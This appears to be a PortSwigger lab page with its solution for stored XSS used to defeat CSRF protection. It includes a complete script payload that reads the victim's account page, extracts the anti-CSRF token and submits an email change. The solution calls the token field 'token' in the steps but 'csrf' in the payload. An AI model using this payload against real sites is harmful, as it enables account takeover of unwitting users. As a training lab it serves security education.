# Lab: Exploiting XSS to bypass CSRF defenses

PRACTITIONER

This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.

You can log in to your own account using the following credentials: `wiener:peter`

Access the lab: https://portswigger.net/academy/labs/launch/49e763496c6cdc049d3bc1855b2cf77f952d4f6c5793794e98ec2c06ca2fc193?referrer=%2fweb-security%2fcross-site-scripting%2fexploiting%2flab-perform-csrf

Hint

* You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim.

Solution

{% stepper %}
{% step %}
### Step: Log in and inspect account page

1. Log in using the credentials provided.
2. On your user account page, notice the function for updating your email address.
3. View the page source to confirm:
   * You need to issue a POST request to `/my-account/change-email`, with a parameter called `email`.
   * There's an anti-CSRF token in a hidden input called `token`.

This means your exploit must load the user account page, extract the CSRF token, and then use the token to change the victim's email address.
{% endstep %}

{% step %}
### Step: Craft and submit the XSS payload

Submit the following payload in a blog comment:

{% code title="XSS payload" %}
```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
       var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
       var changeReq = new XMLHttpRequest();
       changeReq.open('post', '/my-account/change-email', true);
       changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
{% endcode %}
{% endstep %}
{% endstepper %}

Community solutions

<details>

<summary>z3nsh3ll — Exploiting XSS to perform CSRF (YouTube)</summary>

https://www.youtube.com/channel/UCnWAPVvXxivIo40QpjEMU1w?embeds\_referring\_euri=https%3A%2F%2Fportswigger.net%2F\&embeds\_referring\_origin=https%3A%2F%2Fportswigger.net

https://www.youtube.com/watch?v=DWThhRPwGEg

</details>

<details>

<summary>Michael Sommer — Exploiting XSS to perform CSRF (YouTube)</summary>

https://www.youtube.com/channel/UCfchiSwWibUyS2USW9NQSWw?embeds\_referring\_euri=https%3A%2F%2Fportswigger.net%2F\&embeds\_referring\_origin=https%3A%2F%2Fportswigger.net

https://www.youtube.com/watch?v=TUUSm6o1afA

</details>

Additional resources

* Try Burp Suite for free: https://portswigger.net/burp
